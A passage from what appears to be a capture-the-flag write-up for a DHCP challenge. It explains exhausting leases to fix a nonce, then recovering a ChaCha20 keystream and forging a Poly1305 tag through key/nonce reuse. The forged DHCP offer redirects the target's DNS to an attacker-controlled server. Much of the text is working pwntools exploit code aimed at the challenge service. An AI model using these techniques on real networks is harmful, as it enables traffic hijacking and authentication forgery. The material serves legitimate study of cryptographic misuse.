<h3 id="The-logic"><a href="#The-logic" class="headerlink" title="The logic"></a>The logic</h3><h4 id="4-Forge-a-DHCP-offer-message-and-send-it-to-the-FlagServer-to-reconfigure-their-DNS-server-settings-and-have-them-point-to-us"><a href="#4-Forge-a-DHCP-offer-message-and-send-it-to-the-FlagServer-to-reconfigure-their-DNS-server-settings-and-have-them-point-to-us" class="headerlink" title="4. Forge a DHCP offer message and send it to the FlagServer to reconfigure their DNS server settings and have them point to us"></a>4. Forge a <strong>DHCP offer message</strong> and send it to the <strong>FlagServer</strong> to reconfigure their <strong>DNS server</strong> settings and have them point to us</h4><p>To reconfigure the DNS settings of the <strong>FlagServer</strong>, we need to forge a packet thatâ€™s supposedly encrypted and signed by the <strong>DhcpServer</strong> such that the <strong>FlagServer</strong> will successfully decrypt and verify the signature of it to reconfigure their own DNS settings.</p>
<h4 id="4-1-Retrieve-a-KeyStream-of-the-desired-length-including-the-corresponding-nonce-that-we-want-to-reuse"><a href="#4-1-Retrieve-a-KeyStream-of-the-desired-length-including-the-corresponding-nonce-that-we-want-to-reuse" class="headerlink" title="4.1. Retrieve a KeyStream of the desired length including the corresponding nonce, that we want to reuse"></a>4.1. Retrieve a <strong>KeyStream</strong> of the desired length including the corresponding <code>nonce</code>, that we want to reuse</h4><p>Remembering our analysis of the <code>encrypt_msg</code> function, weâ€™ve noticed a couple of important things about the key and the nonce, both of which are used to compute the final <strong>KeyStream</strong> in the <strong>ChaCha20</strong> cipher.</p>
<p>The cipher key is shared between the encryption on the <strong>DhcpServer</strong> and the decryption on the <strong>FlagServer</strong>, so we donâ€™t have to worry about that one, if we can retrieve the <strong>KeyStream</strong> somehow.</p>
<p>The final nonce for the encryption is computed using the first 32 bytes of each the packet content and the primary nonce created by the <code>get_entropy_from_lavalamps</code> function.</p>
<p>So letâ€™s take an other look at the <code>get_entropy_from_lavalamps</code> function. If we can manage to remove all leases, that contain the string <code>rngserver</code> in their name, we can assure a static primary nonce. To do so, weâ€™ll define a short packet, that fitâ€™s our needs to request a lease from the <strong>DhcpServer</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">dhcp_req_pkt = <span class="hljs-built_in">bytearray</span>(<br>	flag_server_mac + <span class="hljs-comment"># src mac = &lt;YOUR_MAC&gt;</span><br>	dhcp_server_mac + <span class="hljs-comment"># dst mac = &quot;1b 7d 6f 49 37 c9&quot;</span><br>	<span class="hljs-comment"># msg:</span><br>	<span class="hljs-string">b&#x27;\x01&#x27;</span> + <span class="hljs-comment"># DHCP request</span><br>	<span class="hljs-string">b&#x27;&#x27;</span>     + <span class="hljs-comment"># rest of msg</span><br>	<span class="hljs-string">b&#x27;\x00&#x27;</span><br>)<br></code></pre></td></tr></table></figure>

<p>We can also verify that packets received from the <strong>DhcpServer</strong> matches the expected IP addresses by computing the crc32 values for the expected packet for all the possible IPs and comparing the precomputed crc32 values to the crc32 value appended to the message sent by the <strong>DhcpServer</strong>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">crc32s = &#123;&#125; <span class="hljs-comment"># hex(crc32) -&gt; leased ip</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">precompute_crc32</span>(<span class="hljs-params">dhcp_req_pkt</span>):<br>	<span class="hljs-keyword">global</span> crc32s<br>	<span class="hljs-comment"># precompute answer-crc32s:</span><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">64</span>): <span class="hljs-comment"># needs 2, because if you kick rngserver_0 out of the leases, then IP 192.168.1.2 is used!</span><br>		ip = <span class="hljs-string">f&#x27;192.168.1.<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span><br>		crc_pkt = <span class="hljs-built_in">bytearray</span>(<br>			<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)]) +<br>			<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;192.168.1.1&#x27;</span>.split(<span class="hljs-string">&#x27;.&#x27;</span>)]) +<br>			<span class="hljs-built_in">bytes</span>([<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>]) +<br>			<span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>]) +<br>			<span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]) +<br>			dhcp_req_pkt[<span class="hljs-number">12</span>+<span class="hljs-number">1</span>:] +<br>			<span class="hljs-string">b&quot;\x00&quot;</span><br>		)<br>		crc32s[binascii.hexlify(calc_crc(crc_pkt)).decode()] = ip<br></code></pre></td></tr></table></figure>

<p>And letâ€™s just setup a small function to send the crafted packets to the <strong>DhcpServer</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">request_ip_from_dhcp</span>(<span class="hljs-params">flag_print = <span class="hljs-literal">False</span>, dhcp_req_pkt = dhcp_req_pkt</span>):<br>	<span class="hljs-string">&#x27;&#x27;&#x27;Requests an IP from the DHCP and returns it.&#x27;&#x27;&#x27;</span><br>	<span class="hljs-keyword">global</span> crc32s<br>	<span class="hljs-comment"># prompt</span><br>	prompt = conn.readuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>).decode()<br>	<span class="hljs-comment">#print(prompt, end=&#x27;&#x27;)</span><br>	<span class="hljs-comment"># send ip lease request to DHCP Server</span><br>	hex_req = binascii.hexlify(dhcp_req_pkt)<br>	<span class="hljs-comment">#print(&#x27;dhcp packet request:&#x27;, hex_req.decode())</span><br>	conn.sendline(hex_req)<br>	<span class="hljs-comment"># read response:</span><br>	resp = conn.readline().decode().strip()<br>	<span class="hljs-comment">#print(&#x27;resp&#x27;, resp)</span><br>	resp_distant_mac = resp[:<span class="hljs-number">12</span>] <span class="hljs-comment"># dhcp mac</span><br>	<span class="hljs-comment">#print(&#x27;resp_distant_mac&#x27;, resp_distant_mac)</span><br>	resp_my_mac = resp[<span class="hljs-number">12</span>:<span class="hljs-number">24</span>] <span class="hljs-comment"># your own mac</span><br>	<span class="hljs-comment">#print(&#x27;resp_my_mac&#x27;, resp_my_mac)</span><br>	resp_lease_msg = resp[<span class="hljs-number">24</span>:-<span class="hljs-number">8</span>]<br>	resp_lease_msg_2byte = resp_lease_msg[:<span class="hljs-number">2</span>] <span class="hljs-comment"># 02</span><br>	resp_lease_msg_ct = resp_lease_msg[<span class="hljs-number">2</span>:-<span class="hljs-number">56</span>]<br>	resp_lease_msg_tag = resp_lease_msg[-<span class="hljs-number">56</span>:-<span class="hljs-number">24</span>] <span class="hljs-comment"># 16 bytes tag</span><br>	resp_lease_msg_modified_nonce = resp_lease_msg[-<span class="hljs-number">24</span>:] <span class="hljs-comment"># 12 bytes nonce</span><br>	resp_crc32 = resp[-<span class="hljs-number">8</span>:]<br>	<span class="hljs-comment"># Precompute crc32s on the first usage; or when the dhcp_req_pkt changes in content =&gt; resp_crc32 not in crc32s.keys()</span><br>	<span class="hljs-keyword">if</span> resp_crc32 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> crc32s.keys():<br>		precompute_crc32(dhcp_req_pkt)<br>	<span class="hljs-keyword">if</span> flag_print:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;resp_lease_msg&#x27;</span>, resp_lease_msg)<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;resp_lease_msg_2byte&#x27;</span>, resp_lease_msg_2byte)<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;resp_lease_msg_ct&#x27;</span>, resp_lease_msg_ct)<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;resp_lease_msg_tag&#x27;</span>, resp_lease_msg_tag)<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;resp_lease_msg_modified_nonce&#x27;</span>, resp_lease_msg_modified_nonce)<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;resp_crc32&#x27;</span>, resp_crc32, <span class="hljs-string">&#x27;, associated IP:&#x27;</span>, crc32s[resp_crc32])<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Got IP:&#x27;</span>, crc32s[resp_crc32])<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>.fromhex(resp_lease_msg_ct), <span class="hljs-built_in">bytes</span>.fromhex(resp_lease_msg_tag), <span class="hljs-built_in">bytes</span>.fromhex(resp_lease_msg_modified_nonce), crc32s[resp_crc32] <span class="hljs-comment">#.split(&#x27;.&#x27;)[-1]</span><br></code></pre></td></tr></table></figure>

<p>Remembering that the IP <code>192.168.1.1</code> is static to the gateway, <code>192.168.1.2</code> is assigned to <code>rngserver_0</code>, and <code>192.168.1.3</code> is assigned to the <strong>FlagServer</strong>, we need to request leases for all the remaining unassigned IP addresses ending in a number of the range [4 .. 63]. These 60 requests will consume all the remaining unassigned IP addresses. If we now request an additional 61th IP address, weâ€™ll kick out the <code>rngserver_0</code> from the list of leases:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>server = <span class="hljs-string">&#x27;dhcppp.chal.pwni.ng&#x27;</span> <span class="hljs-comment"># remote service</span><br>port = <span class="hljs-number">1337</span><br>conn = remote(server, port)<br><br><span class="hljs-built_in">print</span>(conn.readline().decode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;== FINISHED SERVER BOOT ==&#x27;</span>)<br><br><span class="hljs-comment"># request enough IPs to remove the &#x27;rngserver_0&#x27; from the list of leased IPs...:</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Cycling through some IPs ...&#x27;</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">61</span>):<br>	_, _, _, ip = request_ip_from_dhcp(<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No more &quot;rngserver&quot; in the list of leased IPs&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Now the lavalamp always returns &quot;sha256(RNG_INIT)!&quot;&#x27;</span>)<br><span class="hljs-comment"># next IP will end in &#x27;.3&#x27;</span><br></code></pre></td></tr></table></figure>

<p>Thus form now on, we can assume a static primary nonce with the value of <code>sha256(RNG_INIT)</code>, as long as we donâ€™t hide the string <code>rngserver</code> in any future device name.</p>
<p>Considering that the content of the <strong>DHCP offer message</strong> - which is the part, that will get encrypted - has 19 out of their 20 first bytes fixed and we can control the subsequent bytes, we actually can manipulate the first 32 bytes of this message to pull of a <strong>key and none reuse attack</strong>, especially since we can indirectly control the one remaining byte, which in fact is the last octet of the leased ip address, which we just need to cycle through all the other IP addresses again, as weâ€™ve done before.</p>
<h4 id="4-2-Forge-a-message-to-the-FlagServer-to-override-their-DNS-server-entries"><a href="#4-2-Forge-a-message-to-the-FlagServer-to-override-their-DNS-server-entries" class="headerlink" title="4.2. Forge a message to the FlagServer to override their DNS-server entries"></a>4.2. Forge a message to the <strong>FlagServer</strong> to override their DNS-server entries</h4><h4 id="4-2-1-Craft-the-desired-packet"><a href="#4-2-1-Craft-the-desired-packet" class="headerlink" title="4.2.1. Craft the desired packet"></a>4.2.1. Craft the desired packet</h4><p>Weâ€™ll focus on forging a packet that leases the IP address <code>192.168.1.3</code> (arbitrarily-chosen) and has the following structure for reasons that will become clear later on:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">own_ip_address = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> <span class="hljs-comment"># Change this to your own public IP address, which hosts your DNS and web server.</span><br>ip_dot_3 = <span class="hljs-string">&#x27;192.168.1.3&#x27;</span><br>gateway_ip = <span class="hljs-string">&#x27;192.168.1.1&#x27;</span><br><br>pkt3 = <span class="hljs-built_in">bytearray</span>(<br>	<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>	<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> gateway_ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>	<span class="hljs-built_in">bytes</span>([<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>]) +<br>	<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> own_ip_address.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>	<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> own_ip_address.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>	<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">12</span> +<br>	<span class="hljs-string">b&#x27;\x02&#x27;</span>*<span class="hljs-number">15</span> +<br>	<span class="hljs-string">b&quot;\x00&quot;</span><br>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(pkt3) == <span class="hljs-number">48</span>)<br></code></pre></td></tr></table></figure>

<h4 id="4-2-2-Encrypt-the-desired-packet"><a href="#4-2-2-Encrypt-the-desired-packet" class="headerlink" title="4.2.2. Encrypt the desired packet"></a>4.2.2. Encrypt the desired packet</h4><p>To encrypt this packet <code>pkt3</code>, weâ€™ll need a <strong>KeyStream</strong> of length greater or equal to 48.</p>
<p>Because <strong>ChaCha20</strong> is just an XOR encryption using the <strong>KeyStream</strong> as its XOR key, we can perform a <strong>known-plaintext attack</strong> against the encrypted packets from the <strong>DhcpServer</strong>, allowing us to recover the relevant bytes to encrypt <code>pkt3</code> of the <strong>KeyStream</strong> from just a single known plaintext - ciphertext pair.</p>
<p>To be able to double check our work and because weâ€™re going to need it to forge the tag anyways, letâ€™s get two different plaintext - ciphertext pairs:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python">dhcp_server_mac = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;1b 7d 6f 49 37 c9&quot;</span>)<br>flag_server_mac = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;53 79 82 b5 97 eb&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">byte_xor</span>(<span class="hljs-params">d1, d2</span>):<br>	<span class="hljs-string">&#x27;&#x27;&#x27;Performs a byte-wise XOR on both data-streams.&#x27;&#x27;&#x27;</span><br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([(a^^b) <span class="hljs-keyword">for</span> a,b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(d1, d2)])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_custom_message_with_dhcp</span>(<span class="hljs-params">custom_message_data</span>):<br>	<span class="hljs-string">&#x27;&#x27;&#x27;Returns a keystream for a DHCP-offer message&#x27;&#x27;&#x27;</span><br>	<span class="hljs-keyword">global</span> flag_server_mac, dhcp_server_mac<br>	dhcp_req_pkt = <span class="hljs-built_in">bytearray</span>(<br>		flag_server_mac + <span class="hljs-comment"># src mac</span><br>		dhcp_server_mac + <span class="hljs-comment"># dst mac</span><br>		<span class="hljs-comment"># msg:</span><br>		<span class="hljs-string">b&#x27;\x01&#x27;</span> + <span class="hljs-comment"># DHCP request</span><br>		custom_message_data + <span class="hljs-comment"># rest of msg</span><br>		<span class="hljs-string">b&#x27;\x00&#x27;</span><br>	)<br>	ct, tag, nonce, ip = request_ip_from_dhcp(<span class="hljs-literal">True</span>, dhcp_req_pkt) <span class="hljs-comment"># IP: *.*.*.3</span><br>	packet = <span class="hljs-built_in">bytearray</span>(<br>		<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ip.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>		<span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;192.168.1.1&quot;</span>.split(<span class="hljs-string">&quot;.&quot;</span>)]) +<br>		<span class="hljs-built_in">bytes</span>([<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>]) + <span class="hljs-comment"># subnet mask</span><br>		<span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>]) + <span class="hljs-comment"># dns server 1</span><br>		<span class="hljs-built_in">bytes</span>([<span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>]) + <span class="hljs-comment"># dns server 2</span><br>		dhcp_req_pkt[<span class="hljs-number">12</span>+<span class="hljs-number">1</span>:] +<br>		<span class="hljs-string">b&quot;\x00&quot;</span><br>	)<br>	<span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(packet) == <span class="hljs-number">48</span>)<br>	<span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(ct) == <span class="hljs-number">48</span>)<br>	key_stream = byte_xor(ct, packet)<br>	<span class="hljs-keyword">return</span> key_stream, packet, ct, tag, nonce, ip<br><br><span class="hljs-comment"># lease an IP for the FlagServer and get a KeyStream of specified length for the specified IP</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Reading key_stream for IP 192.168.1.3 with custom message #1&#x27;</span>)<br>_, pkt1, ct1, tag1, nonce1, _ = encrypt_custom_message_with_dhcp((<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">12</span>) + (<span class="hljs-string">b&#x27;\x01&#x27;</span>*<span class="hljs-number">14</span>)) <span class="hljs-comment"># uses IP: 192.168.1.3</span><br><br><span class="hljs-comment"># Again, discard lease requests for any undesired IP addresses:</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Cycling through some IPs ...&#x27;</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">61</span>):<br>	_, _, _, ip = request_ip_from_dhcp(<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># next IP to lease: 192.168.1.3</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Reading key_stream for IP 192.168.1.3 with custom message #2&#x27;</span>)<br>_, pkt2, ct2, tag2, nonce2, _ = encrypt_custom_message_with_dhcp((<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">12</span>) + (<span class="hljs-string">b&#x27;\x02&#x27;</span>*<span class="hljs-number">14</span>)) <span class="hljs-comment"># uses IP: 192.168.1.3</span><br></code></pre></td></tr></table></figure>

<p>Since both the nonce and key are reused, and we know both the plaintext and ciphertext, we can directly recover the keystream via XOR and use this to encrypt arbitrary messages, i.e. <code>pkt3</code>in our use case:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">key1 = byte_xor(pkt1, ct1)<br>key2 = byte_xor(pkt2, ct2)<br><span class="hljs-keyword">assert</span>(key1 == key2)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(key1) == <span class="hljs-number">48</span>)<br>key = key1<br><br>ct3 = byte_xor(pkt3, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;ct3 = <span class="hljs-subst">&#123;ct3.<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h4 id="4-3-Attempt-to-forge-the-tag-for-the-encrypted-message-compute-the-corresponding-checksum-and-send-the-message-to-the-FlagServer"><a href="#4-3-Attempt-to-forge-the-tag-for-the-encrypted-message-compute-the-corresponding-checksum-and-send-the-message-to-the-FlagServer" class="headerlink" title="4.3. Attempt to forge the tag for the encrypted message, compute the corresponding checksum and send the message to the FlagServer"></a>4.3. Attempt to forge the <strong>tag</strong> for the encrypted message, compute the corresponding <strong>checksum</strong> and send the message to the <strong>FlagServer</strong></h4><p>This section addresses the following question: Given the Poly1305 authentication tags <code>tag1, tag2</code> for 2 known, distinct messages <code>msg1, msg2</code> which are MACâ€™ed with the same secret 32-byte Poly1305 key <code>(r,s)</code>, how can we recover <code>(r,s)</code> to forge arbitrary messages?</p>
<p>To implement the Poly1305 key&#x2F;nonce reuse forgery attack, we used the following references:</p>
<ol>
<li>The Poly1305 Wikipedia page (<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Poly1305]">here</a>)</li>
<li>The ChaCha20-Poly1305 Wikipedia Page (<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ChaCha20-Poly1305">here</a>)</li>
<li>RFC 7539, the specification for ChaCha20 and Poly1305 (<a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc7539#section-2.8">here</a>)</li>
<li>This Crypto Stack Exchange post (ponchoâ€™s answer) (<a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/83629/forgery-attack-on-poly1305-when-the-key-and-nonce-reused">here</a>)</li>
<li>The PyCryptodome libraryâ€™s implementation of ChaCha20-Poly1305 and Poly1305 (<a target="_blank" rel="noopener" href="https://github.com/Legrandin/pycryptodome/blob/master/lib/Crypto/Cipher/ChaCha20_Poly1305.py">here</a> and <a target="_blank" rel="noopener" href="https://github.com/Legrandin/pycryptodome/blob/master/lib/Crypto/Hash/Poly1305.py">here</a>)</li>
</ol>
<p>From Ref. 2, we can see the detailed structure of the ChaCha20-Poly1305 AEAD algorithm:<br><img src="../../../../images/plaid24/ChaCha20-Poly1305.jpg" srcset="/img/loading.gif" lazyload alt="chacha20_poly1305"></p>
<p>ChaCha20 is used to generate a keystream that is XORed with the plaintext to produce the ciphertext. The ciphertext (C) and the associated data (AD) are then authenticated using Poly1305 to provide an authentication tag to ensure integrity. Poly1305 takes as its input a message with the following field structure: <code>AD || pad(AD) || C || pad(C) || len(AD) || len(C)</code>. The server code in this challenge doesnâ€™t use any AD, so in our scenario we only have <code>C || pad(C) || len(AD) || len(C)</code>. For the forgery attack to work, we need two messages encrypted&#x2F;authenticated with the same nonce&#x2F;key - and we already have these from Section 4.2.2! Letâ€™s use the ciphertexts to construct the full input messages to the Poly1305 authenticator:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">msg1 = ct1 + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + long_to_bytes(<span class="hljs-built_in">len</span>(ct1)) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span><br>msg2 = ct2 + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span> + long_to_bytes(<span class="hljs-built_in">len</span>(ct2)) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">7</span><br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg1) % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg2) % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg1) == <span class="hljs-built_in">len</span>(msg2))<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(msg1) == <span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure>

<p>Now, with the messages <code>msg1, msg2</code> and tags <code>tag1, tag2</code>, how can we recover the secret 32-byte Poly1305 key <code>(r,s)</code>? From <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Poly1305#Use_as_a_one-time_authenticator">this section of the Wikipedia page on Poly1305</a> (Ref. 1 above) and also the crypto stack exchange answer (Ref. 4 above), we learn that reuse of the same <code>(r,s)</code> for <code>msg1 != msg2</code> gives us</p>
<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">
  <mi>t</mi>
  <mi>a</mi>
  <msub>
    <mi>g</mi>
    <mn>1</mn>
  </msub>
  <mo>=</mo>
  <mo stretchy="false">(</mo>
  <mi>P</mi>
  <mi>o</mi>
  <mi>l</mi>
  <mi>y</mi>
  <msub>
    <mn>1305</mn>
    <mi>r</mi>
  </msub>
  <mo stretchy="false">(</mo>
  <mi>m</mi>
  <mi>s</mi>
  <msub>
    <mi>g</mi>
    <mn>1</mn>
  </msub>
  <mo stretchy="false">)</mo>
  <mo>+</mo>
  <mi>s</mi>
  <mo stretchy="false">)</mo>
  <mstyle>
    <mspace width="1em"></mspace>
  </mstyle>
  <mi>m</mi>
  <mi>o</mi>
  <mi>d</mi>
  <mstyle>
    <mspace width="1em"></mspace>
  </mstyle>
  <msup>
    <mn>2</mn>
    <mrow data-mjx-texclass="ORD">
      <mn>128</mn>
    </mrow>
  </msup>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mstyle>
    <mspace width="0.278em"></mspace>
  </mstyle>
  <mo stretchy="false">(</mo>
  <mn>1</mn>
  <mo stretchy="false">)</mo>
</math>

<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">
  <mi>t</mi>
  <mi>a</mi>
  <msub>
    <mi>g</mi>
    <mn>2</mn>
  </msub>
  <mo>=</mo>
  <mo stretchy="false">(</mo>
  <mi>P</mi>
